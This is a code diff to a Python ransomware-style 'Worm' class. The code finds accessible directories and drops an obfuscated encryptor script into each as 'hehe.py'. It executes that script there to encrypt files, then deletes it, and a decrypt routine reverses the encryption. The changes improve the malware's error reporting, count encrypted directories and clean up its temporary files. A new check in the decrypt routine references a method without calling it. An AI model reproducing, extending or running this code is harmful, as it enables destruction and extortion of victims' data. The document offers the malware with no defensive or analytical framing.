@@ -28,7 +28,7 @@ class Worm:
                                 self.target_dir_list.append(directory_path)
                                 break
                     except PermissionError:
-                        pass
+                        print("PermissionError " + target)
 
         print("[*] Found " + str(len(self.target_dir_list)) + " targetable directories.")
         self.directories_found = True
@@ -42,6 +42,7 @@ class Worm:
         with open(ENCRYPTOR_PATH, "r") as f:
             encryptor = f.read()
 
+        count = 0
         for target in self.target_dir_list:
             times = random.randrange(1, 25)
             for i in range(times):
@@ -53,19 +54,25 @@ class Worm:
 
             os.system(f"python.exe ./py_fuscate.py -i {to_infect} -o {to_infect_o} -c 100")
 
-            count = 0
             try:
                 with open(target + "/hehe.py", "w") as f:
                     with open(to_infect_o, "r") as fe:
                         f.write(fe.read())
                 os.system("cd " + target + " && python.exe hehe.py && cd " + THIS_DIR)
                 os.remove(target + "\\hehe.py")
+                count += 1
             except PermissionError:
-                pass
+                print("PermissionError " + target)
             except FileNotFoundError:
-                pass
+                print("FileNotFoundError " + target)
+        print(str(count) + " directories had their files encrypted.")
+        os.remove(to_infect)
+        os.remove(to_infect_o)
 
     def decrypt_files(self):
+        if not self.directories_found:
+            self.find_directories
+
         count = 0
         for target in self.target_dir_list:
             try:
@@ -86,7 +93,7 @@ class Worm:
                         os.remove(target + file)
                         count += 1
             except PermissionError:
-                pass
+                print("PermissionError " + target)
 
         print("[*] " + str(count) + " files were decrypted!")
 
@@ -156,4 +163,7 @@ if __name__ == "__main__":
                 print("[!] Invalid Option.")
                 print("[!] Try again...")
     if os.path.exists(THIS_DIR + "\\tmp"):
-        os.rmdir("tmp")
+        try:
+            os.rmdir("tmp")
+        except OSError:
+            pass
